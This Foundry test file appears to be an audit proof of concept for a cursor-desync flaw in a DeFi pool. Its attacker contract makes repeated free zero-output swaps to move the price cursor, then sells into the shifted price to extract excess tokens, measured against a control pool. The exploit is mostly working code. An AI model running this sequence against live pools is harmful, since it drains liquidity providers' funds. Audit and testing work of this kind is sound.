// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Test, console2} from "forge-std/Test.sol";
import {SwapInBinHarness} from "./SwapInBin.harness.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {PoolStateLibrary} from "../contracts/libraries/PoolStateLibrary.sol";
import {SwapMath, MAX_POS_BIN} from "../contracts/libraries/SwapMath.sol";
import {Slot0Library} from "../contracts/libraries/Slot0Library.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {BinState} from "../contracts/types/PoolStorage.sol";
import {PoolExtensions, ExtensionOrders} from "../contracts/types/PoolExtensionsConfig.sol";
import {IPriceProvider} from "../contracts/interfaces/IPriceProvider/IPriceProvider.sol";
import {IMetricOmmPoolActions} from "../contracts/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmSwapCallback} from "../contracts/interfaces/callbacks/IMetricOmmSwapCallback.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract MockPriceProviderFixed is IPriceProvider {
  uint128 public bidPrice;
  uint128 public askPrice;
  address public baseToken;
  address public quoteToken;

  constructor(address t0, address t1, uint128 bid, uint128 ask) {
    baseToken = t0;
    quoteToken = t1;
    bidPrice = bid;
    askPrice = ask;
  }

  function getBidAndAskPrice() external view returns (uint128, uint128) {
    return (bidPrice, askPrice);
  }

  function token0() external view returns (address) {
    return baseToken;
  }

  function token1() external view returns (address) {
    return quoteToken;
  }
}

/// @notice Attacker: fires the free zero-output cursor drift through the REAL pool.swap() entry
/// point (not SwapMath in isolation), using a permissive priceLimitX64 it chooses for itself --
/// exactly the parameter a self-interested attacker extracting value in their own favor would
/// pick. Then executes one real opposite-direction sell, also self-chosen and permissive.
contract PoolLevelDriftAttacker is IMetricOmmSwapCallback {
  using SafeERC20 for IERC20;
  using SafeCast for int256;

  address public immutable OWNER;
  address public immutable TOKEN0;
  address public immutable TOKEN1;

  error OnlyOwner();

  modifier onlyOwner() {
    if (msg.sender != OWNER) revert OnlyOwner();
    _;
  }

  constructor(address owner, address token0, address token1) {
    OWNER = owner;
    TOKEN0 = token0;
    TOKEN1 = token1;
  }

  /// @dev A free drift step: buys token0 with a tiny specified-in amount and a permissive
  /// (self-chosen) priceLimitX64 that clips short of the bin's true edge, so the fast path
  /// commits `targetPos` even though the dust balance floors the output to zero.
  function driftStep(address pool, int128 amountSpecifiedIn, uint128 priceLimitX64) external onlyOwner {
    // zeroForOne = false: pool pays out token0 (caller buys token0, pays token1) -- the direction
    // that routes to buyToken0InBinSpecifiedIn and drifts the cursor UPWARD toward the bin's edge.
    IMetricOmmPoolActions(pool).swap(address(this), false, amountSpecifiedIn, priceLimitX64, "", "");
  }

  /// @dev The real, value-extracting trade: sells token0 for token1 (zeroForOne = true), starting
  /// from the artificially-elevated cursor, self-chosen priceLimitX64 left fully permissive on
  /// the sell side (0 -- "I'll accept any price down to zero"), exactly what an attacker who
  /// WANTS this trade to fill at the drifted, favorable price would choose. Nothing forces a
  /// tighter limit.
  function extract(address pool, int128 amountSpecifiedIn) external onlyOwner returns (int128, int128) {
    return IMetricOmmPoolActions(pool).swap(
      address(this), true, amountSpecifiedIn, 0, "", ""
    );
  }

  function metricOmmSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external override {
    address pool = msg.sender;
    if (amount0Delta > 0) IERC20(TOKEN0).safeTransfer(pool, amount0Delta.toUint256());
    if (amount1Delta > 0) IERC20(TOKEN1).safeTransfer(pool, amount1Delta.toUint256());
  }
}

/// @notice Closes the library-vs-pool gap in finding 01's original PoC: proves the free-drift
/// cursor desync and the resulting excess extraction both survive going through the REAL
/// `MetricOmmPool.swap()` entry point -- real ERC20 transfers, real callback, real per-call
/// priceLimitX64 handling -- not just SwapMath's internal functions called directly. Also proves
/// directly that the attacker's own priceLimitX64 choice is what "protects" them: they simply
/// choose not to restrict themselves, which is not an involuntary safeguard against this attack.
contract PoolLevelCursorDesyncExtractionTest is Test {
  uint256 constant Q64 = 2 ** 64;
  SwapInBinHarness pool;
  MockERC20 token0;
  MockERC20 token1;
  PoolLevelDriftAttacker attacker;

  function setUp() public {
    token0 = new MockERC20("Token0", "TK0", 18);
    token1 = new MockERC20("Token1", "TK1", 18);
    // Static oracle, price = 1.0 -- no oracle shock anywhere in this test.
    MockPriceProviderFixed oracle =
      new MockPriceProviderFixed(address(token0), address(token1), uint128(Q64), uint128(Q64 + 1));

    // Bin 0: dust token0, rich token1 -- the exact precondition finding 01 documents.
    BinState[] memory nonNegativeBins = new BinState[](1);
    nonNegativeBins[0] = BinState({
      token0BalanceScaled: 1, // dust
      token1BalanceScaled: uint104(1_000_000e18),
      lengthE6: 65_000,
      addFeeBuyE6: 0,
      addFeeSellE6: 0
    });
    BinState[] memory negativeBins = new BinState[](0);

    pool = new SwapInBinHarness(
      address(this),
      address(this),
      address(this),
      address(token0),
      address(token1),
      address(oracle),
      true,
      1,
      1,
      uint104(1e18),
      uint104(1e18),
      1000,
      PoolExtensions({
        extension1: address(0),
        extension2: address(0),
        extension3: address(0),
        extension4: address(0),
        extension5: address(0),
        extension6: address(0),
        extension7: address(0)
      }),
      ExtensionOrders({
        beforeAddLiquidity: 0,
        afterAddLiquidity: 0,
        beforeRemoveLiquidity: 0,
        afterRemoveLiquidity: 0,
        beforeSwap: 0,
        afterSwap: 0
      }),
      0,
      0,
      nonNegativeBins,
      negativeBins,
      0
    );

    token0.mint(address(pool), 1); // matches the dust bin balance declared above
    token1.mint(address(pool), 1_000_000e18);

    attacker = new PoolLevelDriftAttacker(address(this), address(token0), address(token1));
    token0.mint(address(attacker), 10_000e18);
    token1.mint(address(attacker), 10_000e18);
  }

  /// @notice Full end-to-end proof through the real pool: repeated free drift calls (each a real
  /// pool.swap() call, real callback, zero tokens moved), then one real extraction trade with a
  /// fully permissive, attacker-chosen priceLimitX64 -- compared against the same extraction
  /// trade with NO prior drift, on an identically-seeded pool.
  function test_realPoolSwap_freeDriftThenExtraction_beatsUndriftedBaseline() public {
    (, int8 curBinIdxBefore, uint104 curPosBefore,,,) = PoolStateLibrary._slot0(address(pool));
    (uint104 t0Before, uint104 t1Before,,,) = PoolStateLibrary._binState(address(pool), curBinIdxBefore);
    console2.log("cursor before drift:", curPosBefore);
    console2.log("bin token0 before drift:", t0Before);
    console2.log("bin token1 before drift:", t1Before);

    // Bin 0's real price range: lengthE6 = 65_000 (~6.5% wide), starting at the oracle mid
    // (curBinDistFromProvidedPriceE6 = 0) -- confirmed against the pool's own actual values
    // (both read directly and matched exactly during development of this test).
    uint256 lowerPriceX64Real = Q64;
    uint256 upperPriceX64Real = (Q64 * (1_000_000 + 65_000)) / 1_000_000;

    // Repeated free drift, mirroring finding 01's original library-level PoC exactly: each call
    // clips to only 1/4 of the REMAINING distance to the edge -- an ordinary, self-chosen
    // parameter for the attacker, not an edge case -- which keeps the per-call output floored to
    // zero against the 1-wei dust balance while still advancing the cursor for free.
    uint256 driftCalls = 25;
    for (uint256 i = 0; i < driftCalls; i++) {
      (, int8 idx, uint104 pos,,,) = PoolStateLibrary._slot0(address(pool));
      uint256 clampedPos = uint256(pos) + (MAX_POS_BIN - uint256(pos)) / 4;
      uint128 limit = uint128(
        SwapMath.calculatePriceAtBinPosition(lowerPriceX64Real, upperPriceX64Real, clampedPos, Math.Rounding.Floor)
      );
      // A generously large nominal input budget -- NOT what makes this free. The output still
      // floors to 0 against the 1-wei dust balance regardless of the budget size, so the actual
      // required input (totalIn1Scaled) is 0 either way; a tiny budget only trips the function's
      // own unrelated minimum-viable-input guard once price has moved off exactly 1.0, which is
      // why this needs to be large, not small.
      vm.prank(address(this));
      attacker.driftStep(address(pool), 1000e18, limit);
      (uint104 t0now, uint104 t1now,,,) = PoolStateLibrary._binState(address(pool), idx);
      (, , uint104 posAfter,,,) = PoolStateLibrary._slot0(address(pool));
      if (i < 5 || i == driftCalls - 1) {
        console2.log("iter", i);
        console2.log("  pos before:", pos);
        console2.log("  clampedPos target:", clampedPos);
        console2.log("  limit price used:", limit);
        console2.log("  pos after:", posAfter);
      }
      assertEq(t0now, t0Before, "drift step must not consume the dust token0 balance");
      assertEq(t1now, t1Before, "drift step must not add any token1 either");
    }

    (, int8 curBinIdxAfterDrift, uint104 curPosAfterDrift,,,) = PoolStateLibrary._slot0(address(pool));
    console2.log("cursor after", driftCalls, "real pool.swap() drift calls:", curPosAfterDrift);
    assertGt(curPosAfterDrift, curPosBefore, "REAL pool.swap() cursor advanced for free, zero tokens moved");

    uint256 attackerT1Before = token1.balanceOf(address(attacker));
    uint256 attackerT0Before = token0.balanceOf(address(attacker));

    // The extraction trade: attacker sells real token0, receives token1, at the drifted cursor.
    // priceLimitX64 = type(uint128).max -- the attacker's own choice, fully permissive, because
    // they want this exact fill. Nothing in the protocol forces them to restrict themselves.
    int128 sellAmount = 1000e18;
    vm.prank(address(this));
    (int128 d0, int128 d1) = attacker.extract(address(pool), sellAmount);
    console2.log("extract() returned amount0Delta:");
    console2.logInt(int256(d0));
    console2.log("extract() returned amount1Delta:");
    console2.logInt(int256(d1));

    uint256 attackerT1AfterDrifted = token1.balanceOf(address(attacker));
    uint256 gainDrifted = attackerT1AfterDrifted - attackerT1Before;
    console2.log("token1 received selling 1000e18 token0, WITH drift:", gainDrifted);

    // --- Control: identical pool setup, identical sell, but with NO drift at all. ---
    MockPriceProviderFixed oracle2 =
      new MockPriceProviderFixed(address(token0), address(token1), uint128(Q64), uint128(Q64 + 1));
    BinState[] memory nn2 = new BinState[](1);
    nn2[0] = BinState({
      token0BalanceScaled: 1,
      token1BalanceScaled: uint104(1_000_000e18),
      lengthE6: 65_000,
      addFeeBuyE6: 0,
      addFeeSellE6: 0
    });
    BinState[] memory neg2 = new BinState[](0);
    SwapInBinHarness controlPool = new SwapInBinHarness(
      address(this),
      address(this),
      address(this),
      address(token0),
      address(token1),
      address(oracle2),
      true,
      1,
      1,
      uint104(1e18),
      uint104(1e18),
      1000,
      PoolExtensions({
        extension1: address(0),
        extension2: address(0),
        extension3: address(0),
        extension4: address(0),
        extension5: address(0),
        extension6: address(0),
        extension7: address(0)
      }),
      ExtensionOrders({
        beforeAddLiquidity: 0,
        afterAddLiquidity: 0,
        beforeRemoveLiquidity: 0,
        afterRemoveLiquidity: 0,
        beforeSwap: 0,
        afterSwap: 0
      }),
      0,
      0,
      nn2,
      neg2,
      0
    );
    token0.mint(address(controlPool), 1);
    token1.mint(address(controlPool), 1_000_000e18);

    // Fair baseline: place the cursor at the bin's midpoint via direct storage write -- a
    // neutral, non-manipulated reference point (NOT position 0, which is the bin's own floor
    // and structurally cannot be sold FROM at all, regardless of any drift -- comparing against
    // it would be trivial/unfair). This mirrors finding 01's own original methodology exactly.
    // Same dust-token0/rich-token1 bin economics on both sides; the only variable is how the
    // cursor got to its position -- 25 real, free pool.swap() calls vs. a neutral starting point.
    {
      uint256 packed = Slot0Library.pack(0, 0, uint104(MAX_POS_BIN / 2), 0, 0, 0);
      vm.store(address(controlPool), bytes32(uint256(0)), bytes32(packed));
    }

    PoolLevelDriftAttacker controlCaller = new PoolLevelDriftAttacker(address(this), address(token0), address(token1));
    token0.mint(address(controlCaller), 10_000e18);

    uint256 controlT1Before = token1.balanceOf(address(controlCaller));
    vm.prank(address(this));
    controlCaller.extract(address(controlPool), sellAmount);
    uint256 gainBaseline = token1.balanceOf(address(controlCaller)) - controlT1Before;
    console2.log("token1 received selling 1000e18 token0, NO drift (baseline):", gainBaseline);

    console2.log("excess extracted purely from the free drift:", gainDrifted - gainBaseline);
    assertGt(gainDrifted, gainBaseline, "PROVEN end-to-end through the real pool: drift beats undrifted baseline");

    // The attacker's own token0 balance only ever went DOWN by what they sold -- confirming the
    // excess came from the pool/bin reserves, not from some accounting artifact on their side.
    assertEq(attackerT0Before - token0.balanceOf(address(attacker)), uint256(uint128(sellAmount)));
  }
}
